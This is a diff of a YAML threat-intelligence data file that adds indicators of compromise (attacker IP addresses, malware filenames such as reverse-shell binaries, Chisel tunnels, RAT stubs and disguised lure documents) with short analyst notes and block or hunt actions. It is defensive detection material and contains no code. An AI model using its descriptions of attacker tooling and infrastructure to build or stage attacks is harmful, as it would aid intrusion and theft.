+      context: "Commodity SharpHound PowerShell ingestor (stock variant)."
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "sharpsecdump.exe"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "winpeas.exe"
+      context: "Commodity Windows enumeration / privilege escalation discovery tool."
       confidence: "HIGH"
       action: null
       fp_risk: null
@@ -10147,12 +12130,12 @@
   feed_url: "/ioc-feeds/opendirectory-62-60-237-100-20260506-iocs.json"
   report_url: "/reports/opendirectory-62-60-237-100-20260506/"
   detection_url: "/hunting-detections/opendirectory-62-60-237-100-20260506-detections"
-  total: 125
+  total: 169
   untyped: 47
   counts:
     domain: 3
-    filename: 8
-    ipv4: 4
+    filename: 48
+    ipv4: 8
     md5: 14
     path: 19
     pattern: 10
@@ -10164,9 +12147,21 @@
   has_fp_risk: true
   rows:
     - type: "ipv4"
+      value: "109.120.137.6"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "ipv4"
       value: "109.120.137.6:80"
       context: null
       confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "ipv4"
+      value: "185.241.208.129"
+      context: null
+      confidence: "DEFINITE"
       action: null
       fp_risk: null
     - type: "ipv4"
@@ -10176,9 +12171,21 @@
       action: null
       fp_risk: null
     - type: "ipv4"
+      value: "62.60.237.100"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "ipv4"
       value: "62.60.237.100:80"
       context: null
       confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "ipv4"
+      value: "80.253.249.186"
+      context: null
+      confidence: "HIGH"
       action: null
       fp_risk: null
     - type: "ipv4"
@@ -10806,6 +12813,102 @@
       action: null
       fp_risk: null
     - type: "filename"
+      value: "1.msc"
+      context: "MSC file (GrimResource technique); Tier-1 simplest variant"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "13223.lnk"
+      context: "LNK shortcut chained through 2.url"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "1468_US_23.106.161.1_28-01-26.cab"
+      context: "CAB file with embedded victim/3rd-party IP in filename (per-victim customization pattern)"
+      confidence: "MODERATE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "5273fc9f sibling wrapper"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "807d7b6.tmp"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "865fdfd.tmp"
+      context: "PE-mapping metadata blob (40 bytes); pointed at by env var JJZIUTSQYJMNTZ"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "LDKPOIZD.exe (= cytotoxin.exe)"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "NDA2026.zip"
+      context: "Russian-doll archive containing NDA.zip"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "NDA_Agreements.PDF_2025-12-22 06-50-31-659.exe"
+      context: "NDA-themed fake-PDF .exe; long-timestamp filename hides .exe extension"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "NDA_Agreements.PDF_2025-12-22-06-50-39-658.exe (5.4 MB)"
+      context: "NDA-themed fake-PDF .exe variant"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "Price.zip"
+      context: "Russian-doll archive containing MSCFile.msc and other lures"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "PriceList.PDF_2025-12-22 06-50-39-659.exe"
+      context: "Price-themed fake-PDF .exe"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "carriers.exe"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "carriers.tmp"
+      context: "Inno Setup runtime extracted from Carriers.exe; spawns CrystSupervisor32.exe"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "carriers_agreements_009rcarheffd..scr"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "crisp.exe"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
       value: "crystsupervisor32.exe"
       context: null
       confidence: "HIGH"
@@ -10818,8 +12921,20 @@
       action: null
       fp_risk: null
     - type: "filename"
+      value: "excel_2016_windows.bat"
+      context: "Macro security disable BAT, sets Office VBAWarnings=1"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
       value: "exceptionhandler.dll"
       context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "macros64_2_.xll"
+      context: "Excel XLL add-in (49 KB)"
       confidence: "HIGH"
       action: null
       fp_risk: null
@@ -10830,26 +12945,158 @@
       action: null
       fp_risk: null
     - type: "filename"
+      value: "mscfile.msc"
+      context: "MSC file (Tier-2); inside Price.zip"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "mwxtckdb.exe"
+      context: "Penguish family loader; VT 43/73; same VHash family as Carriers.exe"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "nda.doc"
+      context: "Macro Office doc; downloads from Mega.io /busket/Bravo/vida/NGZTDICF.exe"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "nda_agreementsfdp.msi"
+      context: "RTLO-disguised MSI installer (filename appears as .PDF via U+202E)"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "nda_verification222.url"
+      context: "NDA-themed .url; points to onedrive.to"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
       value: "networkspec17.log"
-      context: "Operator encrypted Stage-3 carrier; distinctive filename"
+      context: null
       confidence: "DEFINITE"
       action: null
       fp_risk: null
     - type: "filename"
       value: "nleservice.dll"
-      context: "Operator-rebuilt-but-unmodified Wondershare DLL; campaign-bespoke hash"
+      context: null
       confidence: "MODERATE"
       action: null
       fp_risk: null
     - type: "filename"
-      value: "shadermgr93.rc"
-      context: "Operator config blob; distinctive filename"
+      value: "pe_03 (HijackLoader proper)"
+      context: null
       confidence: "DEFINITE"
       action: null
       fp_risk: null
     - type: "filename"
+      value: "pe_06 (Rugmi.HP GoProxy installer)"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "pe_07 (operator-bespoke cleanup helper)"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "ppmanlyp.exe"
+      context: null
+      confidence: "MODERATE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "price2.pdf.msc"
+      context: "MSC file (GrimResource Tier-2 with Defender exclusion + dual-source download)"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "price2026.zip"
+      context: "Sibling zip variant"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "price3.xll"
+      context: "Excel XLL add-in (3.4 MB DLL with init.dll,#1 rundll32 entry); macro-block bypass"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "price4.xls"
+      context: "Macro Office doc; downloads from Mega.io /busket/putty2.exe"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "price5.docm"
+      context: "Macro Office doc; 29/63 VT; downloads from Mega.io /busket/putty2.exe"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "price6.doc"
+      context: "Macro Office doc; downloads from Mega.io /busket/putty2.exe"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "shadermgr93.rc"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "sss.lnk"
+      context: "LNK shortcut targeting explorer.exe + UNC argument"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "stage2_shellcode.bin"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "vfszqptv.exe"
+      context: "Sibling Embarcadero Delphi loader on staging server"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "vsezbsrabotat.url"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "watchermgmt"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
       value: "watchermgmt.job"
-      context: "Persistence, legacy .job file in C:\\Windows\\Tasks\\"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "wvault.exe"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: "Hash is legitimate Qihoo 360 product, only flag when dropped to non-standard paths (C:\\ProgramData\\WVault.exe)"
+    - type: "filename"
+      value: "xxx.lnk"
+      context: "LNK shortcut targeting explorer.exe + UNC argument"
       confidence: "HIGH"
       action: null
       fp_risk: null
@@ -11020,12 +13267,12 @@
   feed_url: "/ioc-feeds/opendirectory-74-0-42-25-20260316-iocs.json"
   report_url: "/reports/zerotrace-74-0-42-25-20260316/"
   detection_url: "/hunting-detections/opendirectory-74-0-42-25-20260316-detections"
-  total: 135
+  total: 166
   untyped: 35
   counts:
     domain: 7
-    filename: 4
-    ipv4: 11
+    filename: 34
+    ipv4: 12
     md5: 34
     path: 3
     pattern: 12
@@ -11037,6 +13284,12 @@
   has_action: false
   has_fp_risk: false
   rows:
+    - type: "ipv4"
+      value: "185.49.126.140"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
     - type: "ipv4"
       value: "185.49.126.140:443"
       context: "ScreenConnect admin panel HTTPS, adminxyzhosting.com hosting IP"
@@ -11752,26 +14005,206 @@
       action: null
       fp_risk: null
     - type: "filename"
-      value: "attachment.vbs"
-      context: "Phishing VBScript dropper, filename designed for email delivery"
+      value: "2.exe"
+      context: "XWorm V5.6 client stub, VB.NET, 33280 bytes"
       confidence: "DEFINITE"
       action: null
       fp_risk: null
     - type: "filename"
-      value: "faidowra.dll"
-      context: "PureRAT v4.1.9 payload DLL, name is campaign-specific artifact"
+      value: "5666.exe"
+      context: "XWorm V5.6 client stub, VB.NET, 36864 bytes"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "99999999.exe"
+      context: "XWorm V5.6 client stub, VB.NET, 36864 bytes"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "Exe To Base64 Converter V2.exe"
+      context: "Operator PE-to-base64 encoding utility, Guna UI v2; .NET 4.7.2"
       confidence: "HIGH"
       action: null
       fp_risk: null
     - type: "filename"
+      value: "aspdkzb.exe"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "attachment.vbs"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "binajg.exe"
+      context: "Stage 1, ConfuserEx fileless loader (Aspdkzb cluster variant); 322048 bytes"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "calc.exe"
+      context: "XWorm V5.6 client stub, deceptive filename mimics Windows Calculator"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "eokqegd.exe"
+      context: "Stage 1, ConfuserEx fileless loader (Aspdkzb cluster variant); 312832 bytes"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "faidowra.dll"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "fixer.bat"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "geejuev.exe"
+      context: "Stage 1, ConfuserEx fileless loader (Aspdkzb cluster variant); 324608 bytes"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "jhmwqqkp.exe"
+      context: "Stage 1, ConfuserEx fileless loader (Aspdkzb cluster variant); 312832 bytes"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "kwwrxbsoa.exe"
+      context: "Stage 1, ConfuserEx fileless loader (Aspdkzb cluster variant); 324096 bytes"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "new_vzzzzzz_2828.exe"
+      context: "XWorm V5.6 client stub, VB.NET, 40960 bytes"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "oiflbd.exe"
+      context: "Stage 1, ConfuserEx fileless loader (Aspdkzb cluster variant); 323584 bytes"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "ptmrxpgw.exe"
+      context: "Stage 1, ConfuserEx fileless loader (Aspdkzb cluster variant); 324608 bytes"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "puf.ps1"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "purerat.exe"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "ravenoriginalstub.exe"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "simplehelp_technicianwinlauncher.exe"
+      context: "ScreenConnect launcher (post-overlay-strip); MSVC VS2005; 339968 bytes"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "support.ClientSetup(2).exe"
+      context: "ScreenConnect client installer v2, Authenticode-signed; post-overlay-strip; 5210112 bytes"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "support.ClientSetup(3).exe"
+      context: "ScreenConnect client installer v3, Authenticode-signed; post-overlay-strip; 5767168 bytes"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "sync.ps1"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "tckimpw.exe"
+      context: "Stage 1, ConfuserEx fileless loader (Aspdkzb cluster variant); 324608 bytes"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "victest.exe"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
       value: "vlc_boxed.exe"
-      context: "Unknown DGA malware using VLC Media Player filename for social engineering"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "xclient.exe"
+      context: "XWorm V5.6 client stub, primary analysis sample; C2 config fully decrypted"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "xclient9999.exe"
+      context: "XWorm V5.6 client stub, VB.NET, 36864 bytes"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "xh.exe"
+      context: "PureHVNC victim stub, C2 185.49.126.140:8000; references PHVNC.exe; VB.NET 62464 bytes"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "xworm_v5.6.exe"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "xwormloader.exe"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "ysoserial.exe"
+      context: null
       confidence: "HIGH"
       action: null
       fp_risk: null
     - type: "filename"
       value: "zvafsyattl.exe"
-      context: "PureRAT Stage 2 loader, random-looking name is install filename from Aspdkzb string"
+      context: "Stage 2 inner loader, extracted via ExtremeDumper; TEA cipher; .NET Reactor; 325120 bytes"
       confidence: "HIGH"
       action: null
       fp_risk: null
@@ -11858,11 +14291,12 @@
   feed_url: "/ioc-feeds/opendirectory-79-137-192-3-20260515-iocs.json"
   report_url: "/reports/opendirectory-79-137-192-3-20260515/"
   detection_url: "/hunting-detections/opendirectory-79-137-192-3-20260515-detections"
-  total: 68
+  total: 86
   untyped: 144
   counts:
     domain: 17
-    ipv4: 12
+    filename: 16
+    ipv4: 14
     md5: 4
     path: 3
     registry: 1
@@ -11904,11 +14338,23 @@
       action: "BLOCK"
       fp_risk: null
     - type: "ipv4"
+      value: "79.133.180.168"
+      context: null
+      confidence: "DEFINITE"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "ipv4"
       value: "79.133.180.168:3394"
       context: null
       confidence: "DEFINITE"
       action: "BLOCK"
       fp_risk: null
+    - type: "ipv4"
+      value: "79.137.192.3"
+      context: "Multi-tenant IP, connection alone is not cluster-attributable; cross-evidence with operator IOCs required"
+      confidence: "DEFINITE"
+      action: "BLOCK"
+      fp_risk: "Multi-tenant IP, connection alone is not cluster-attributable; cross-evidence with operator IOCs required"
     - type: "ipv4"
       value: "79.137.192.3:443"
       context: "Multi-tenant IP, connection alone is not cluster-attributable; cross-evidence with operator IOCs required"
@@ -12267,7 +14713,7 @@
       value: "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe"
       context: null
       confidence: "HIGH"
-      action: "MONITOR (LEGITIMATE FILE; ABUSE DETECTED VIA OUTBOUND NETWORK CONNECTIONS)"
+      action: "MONITOR"
       fp_risk: null
     - type: "path"
       value: "C:\\sena\\tawateje_lenicetedev68.pdb"
@@ -12280,6 +14726,102 @@
       context: null
       confidence: "HIGH"
       action: "DETECT"
+      fp_risk: null
+    - type: "filename"
+      value: "BellaMain.zip"
+      context: null
+      confidence: "DEFINITE"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
+      value: "a52d0a1829a0ff_15m.exe"
+      context: null
+      confidence: null
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
+      value: "dolap.rar"
+      context: "Hardcoded Telegram bot token 6797512084 + group -1002104835510 + admin alias @AresRS34"
+      confidence: "DEFINITE"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
+      value: "embedded_payload.bin"
+      context: null
+      confidence: "DEFINITE"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
+      value: "favicon.svg"
+      context: null
+      confidence: "DEFINITE"
+      action: "MONITOR"
+      fp_risk: null
+    - type: "filename"
+      value: "incurious.exe"
+      context: null
+      confidence: null
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
+      value: "index-coeww2zm.js"
+      context: null
+      confidence: "DEFINITE"
+      action: "MONITOR"
+      fp_risk: null
+    - type: "filename"
+      value: "kargo.rar"
+      context: null
+      confidence: "DEFINITE"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
+      value: "kourimaobaku.exe"
+      context: null
+      confidence: null
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
+      value: "letgo.rar"
+      context: null
+      confidence: "DEFINITE"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
+      value: "logo.png"
+      context: null
+      confidence: "DEFINITE"
+      action: "MONITOR"
+      fp_risk: null
+    - type: "filename"
+      value: "pttavm.rar"
+      context: null
+      confidence: "DEFINITE"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
+      value: "sahibinden.rar"
+      context: null
+      confidence: "DEFINITE"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
+      value: "shopier.rar"
+      context: null
+      confidence: "DEFINITE"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
+      value: "staticlittlesource.exe"
+      context: null
+      confidence: "DEFINITE"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
+      value: "turkcell.rar"
+      context: null
+      confidence: "DEFINITE"
+      action: "BLOCK"
       fp_risk: null
   never_block_total: 0
   never_block_rows:
@@ -12391,10 +14933,10 @@
   feed_url: "/ioc-feeds/remcos-opendirectory-campaign.json"
   report_url: "/reports/remcos-opendirectory/"
   detection_url: "/hunting-detections/remcos-opendirectory-detections"
-  total: 24
+  total: 25
   untyped: 72
   counts:
-    filename: 3
+    filename: 4
     ipv4: 1
     md5: 2
     path: 7
@@ -12533,21 +15075,27 @@
       action: null
       fp_risk: null
     - type: "filename"
-      value: "Backdoor.exe"
-      context: null
-      confidence: "HIGH"
+      value: "Backdoor.exe / 0.dll / remcos.exe"
+      context: "Remcos RAT Main Payload"
+      confidence: "DEFINITE"
       action: null
       fp_risk: null
     - type: "filename"
-      value: "Payload.exe"
+      value: "backdoor.exe"
       context: null
-      confidence: "DEFINITE"
+      confidence: "HIGH"
       action: null
       fp_risk: null
     - type: "filename"
       value: "p.ini"
       context: null
       confidence: "MODERATE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "payload.exe"
+      context: "VB6 Dropper"
+      confidence: "DEFINITE"
       action: null
       fp_risk: null
   never_block_total: 0
@@ -13115,11 +15663,12 @@
   feed_url: "/ioc-feeds/seasia-gov-exploitation-toolkit-144-172-106-236-iocs.json"
   report_url: "/reports/seasia-gov-exploitation-toolkit-144-172-106-236/"
   detection_url: "/hunting-detections/seasia-gov-exploitation-toolkit-144-172-106-236-detections"
-  total: 30
+  total: 35
   untyped: 28
   counts:
     email: 1
-    ipv4: 1
+    filename: 4
+    ipv4: 2
     md5: 4
     path: 16
     sha1: 4
@@ -13128,6 +15677,12 @@
   has_action: true
   has_fp_risk: false
   rows:
+    - type: "ipv4"
+      value: "144.172.106.236"
+      context: null
+      confidence: "DEFINITE"
+      action: "MONITOR"
+      fp_risk: null
     - type: "ipv4"
       value: "144.172.106.236:9999"
       context: null
@@ -13308,6 +15863,30 @@
       confidence: "HIGH"
       action: "HUNT"
       fp_risk: null
+    - type: "filename"
+      value: "cat.sh"
+      context: null
+      confidence: "HIGH"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "filename"
+      value: "chisel.exe"
+      context: null
+      confidence: "LOW"
+      action: "HUNT"
+      fp_risk: null
+    - type: "filename"
+      value: "tunnel-agent"
+      context: null
+      confidence: "HIGH"
+      action: "HUNT"
+      fp_risk: null
+    - type: "filename"
+      value: "tunnel-server"
+      context: null
+      confidence: "HIGH"
+      action: "HUNT"
+      fp_risk: null
   never_block_total: 21
   never_block_rows:
     - type: "ipv4"
@@ -13400,7 +15979,7 @@
   rows:
     - type: "ipv4"
       value: "151.245.112.70"
-      context: "Reverse DNS identifying Strike.bz VPS provider"
+      context: null
       confidence: "HIGH"
       action: null
       fp_risk: null
@@ -13670,19 +16249,19 @@
       fp_risk: "moderate"
     - type: "filename"
       value: "shadoclient.exe"
-      context: "Shadow RAT staging build original filename"
+      context: "Shadow RAT v2.6.4.0 staging/test build (2,182,144 bytes, .NET 4.7.2, .NET Reactor packed)"
       confidence: "HIGH"
       action: null
       fp_risk: null
     - type: "filename"
       value: "shadow.common.dll"
-      context: "Shadow RAT shared library"
+      context: null
       confidence: "HIGH"
       action: null
       fp_risk: null
     - type: "filename"
       value: "shadowclient.exe"
-      context: "Shadow RAT production build original filename"
+      context: "Shadow RAT v2.6.4.0 production build (2,181,120 bytes, .NET 4.7.2, .NET Reactor packed)"
       confidence: "HIGH"
       action: null
       fp_risk: null
@@ -13694,13 +16273,13 @@
       fp_risk: "moderate"
     - type: "filename"
       value: "xwormclient.exe"
-      context: "XWorm install/original filename (both builds)"
+      context: "XWorm 3.0-5.0 builder output #1 (74,752 bytes, .NET/VB.NET)"
       confidence: "HIGH"
       action: null
       fp_risk: null
     - type: "filename"
       value: "xwormclient2.exe"
-      context: "XWorm builder output #2 original filename"
+      context: "XWorm 3.0-5.0 builder output #2 (63,488 bytes, .NET/VB.NET)"
       confidence: "HIGH"
       action: null
       fp_risk: null
@@ -13754,13 +16333,13 @@
   feed_url: "/ioc-feeds/shinyhunters-dls-91-215-85-22-20260417-iocs.json"
   report_url: "/reports/shinyhunters-dls-91-215-85-22-20260417/"
   detection_url: "/hunting-detections/shinyhunters-dls-91-215-85-22-20260417-detections"
-  total: 38
+  total: 40
   untyped: 81
   counts:
     domain: 6
     email: 2
     filename: 1
-    ipv4: 2
+    ipv4: 4
     path: 5
     pattern: 8
     sha1: 4
@@ -13770,8 +16349,20 @@
   has_fp_risk: true
   rows:
     - type: "ipv4"
+      value: "91.215.43.200"
+      context: "shinyhunte.rs identity-page origin; AS57724 DDoS-Guard (Russia)"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "ipv4"
       value: "91.215.43.200:443"
       context: "shinyhunte.rs identity-page origin; AS57724 DDoS-Guard (Russia)"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "ipv4"
+      value: "91.215.85.22"
+      context: null
       confidence: "DEFINITE"
       action: null
       fp_risk: null
@@ -14014,11 +16605,11 @@
   feed_url: "/ioc-feeds/sliver-c2-windows-postex-staging-193-233-202-17-iocs.json"
   report_url: "/reports/sliver-c2-windows-postex-staging-193-233-202-17/"
   detection_url: "/hunting-detections/sliver-c2-windows-postex-staging-193-233-202-17-detections"
-  total: 308
+  total: 388
   untyped: 56
   counts:
     domain: 7
-    filename: 3
+    filename: 83
     ipv4: 3
     md5: 79
     path: 22
@@ -15766,6 +18357,246 @@
       action: null
       fp_risk: null
     - type: "filename"
+      value: "acl_enum.ps1"
+      context: "Token-impersonation AD enumeration hunting adminCount=1 accounts"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "add_dns_from_37.ps1"
+      context: "Plants the internal A record remotely over WinRM"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "add_dns_publisherres.ps1"
+      context: "Plants an internal A record for the operator domain"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "add_publisherresolution.ps1"
+      context: "Plants an internal A record for the operator domain, hardened variant"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "adduser.ps1"
+      context: "Creates an AD account and adds it to Domain Admins"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "arc39_new.exe"
+      context: "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "assa161_new.exe"
+      context: "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "bkshell.exe"
+      context: null
+      confidence: "MODERATE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "ccenum.ps1"
+      context: "Token-impersonation AD enumeration and SMB share probing"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "ccenum2.ps1"
+      context: "Token-impersonation AD enumeration and SMB share probing, iteration 2"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "chisel.exe"
+      context: "Chisel v1.11.5 Linux ELF, the operator-side tunnel server"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "chisel_new.exe"
+      context: "Chisel v1.11.5 Windows PE client"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "cons_c1.0.1.msi"
+      context: "MSI installer for the Node.js bot with Ethereum-resolved C2"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "cons_c1.0.1.msi decrypted stage 3 payload"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "da_shell_12.exe"
+      context: "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "da_shell_173.exe"
+      context: "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "da_shell_35.exe"
+      context: "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "da_shell_36.exe"
+      context: "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "da_shell_37.exe"
+      context: "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "da_shell_39.exe"
+      context: "Go TCP reverse shell with a hardcoded host:port, retries every 30 seconds"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "dep.ps1"
+      context: "Deployment via Copy-Item with an explicit PSCredential"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "dep2.ps1"
+      context: "Deployment via a mapped drive"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "dep3.bat"
+      context: "Deployment via xcopy, byte-identical to dep4/5/6/7"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "dep4.bat"
+      context: "Deployment via xcopy"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "dep8.bat"
+      context: "Deployment via xcopy, CRLF line endings"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "deploy.cmd"
+      context: "MSI deployment with SMB then WMI plus certutil fallback"
